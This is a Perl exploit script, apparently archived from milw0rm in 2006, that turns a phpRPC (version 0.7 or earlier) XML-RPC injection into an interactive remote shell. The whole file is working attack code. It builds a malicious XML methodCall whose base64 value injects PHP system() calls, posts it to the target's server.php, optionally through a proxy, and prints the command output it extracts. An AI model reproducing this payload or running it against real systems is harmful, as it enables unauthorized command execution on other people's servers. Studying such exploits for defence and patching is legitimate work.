#!/usr/bin/perl
#
# phpRPC <=0.7 Remote Command Execution Exploit
#
# based on: http://www.gulftech.org/?node=research&article_id=00105-02262006
#
# Copyright (c) 2006 cijfer <cijfer@netti!fi>
# All rights reserved.
#
# never ctrl+c again.
# cijfer$ http://target.com/dir
# host changed to 'http://target.com/dir'
# cijfer$ 
#
# $Id: cijfer-prpcxpl.pl,v 0.1 2006/03/01 05:46:00 cijfer Exp $

use LWP::UserAgent;
use URI::Escape;
use Getopt::Long;
use Term::ANSIColor;

$res  = GetOptions("host=s" => \$host, "proxy=s" => \$proxy, "verbose+" => \$verbose);
&usage unless $host;

while()
{
	print color("green"), "cijfer\$ ", color("reset");
	chomp($command = <STDIN>);
	exit unless $command;
	if($command =~ m/^http:\/\/(.*)/g)
	{
		$host="http://".$1;
		print "host changed to '";
		print color("bold"), $host."'\n", color("reset");
	}
	else
	{
		&exploit($command,$host);
	}
}

sub usage
{
	print "phpRPC <=0.7 Remote Command Execution Exploit\n";
	print "usage: $0 -hpv\n\n";
	print "  -h, --host\t\tfull address of target (ex. http://www.website.com/dir)\n";
	print "  -p, --proxy\t\tprovide an HTTP proxy (ex. 0.0.0.0:8080)\n";
	print "  -v, --verbose\t\tverbose mode (debug)\n\n";
	exit;
}

sub exploit
{
	my($command,$host) = @_;

	$cij=LWP::UserAgent->new() or die;
	$cij->agent("Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:2.0) Gecko/20060101");
	$cij->proxy("http", "http://".$proxy."/") unless !$proxy;

	$string  = shift;
	$xml     = "<?xml version=\"1.0\"?>";
	$xml    .= "<methodCall>";
	$xml    .= "<methodName>cijfer";
	$xml    .= "    <params>";
	$xml    .= "	    <param>";
	$xml    .= "	    <value><base64>'));echo\"_cijfer_\n\";system('".$string."');echo\"_cijfer_\";exit();";
	$xml    .= "	    </param>";
	$xml    .= "    </params>";
	$xml    .= "</methodCall>";

	$req=new HTTP::Request 'POST'=>$host."/modules/phpRPC/server.php";
	$req->content_type("text/xml");
	$req->content($xml);
	$out=$cij->request($req);

	if($out->is_success)
	{
		@cij=split("_cijfer_",$out->content);
		print substr(@cij[1],1);
	}

	if($verbose)
	{
		$recv=length $out->content;
		print "Total received bytes: ".$recv."\n";
		$sent=length $command;
		print "Total sent bytes: ".$sent."\n";
	}
}

# milw0rm.com [2006-03-02]
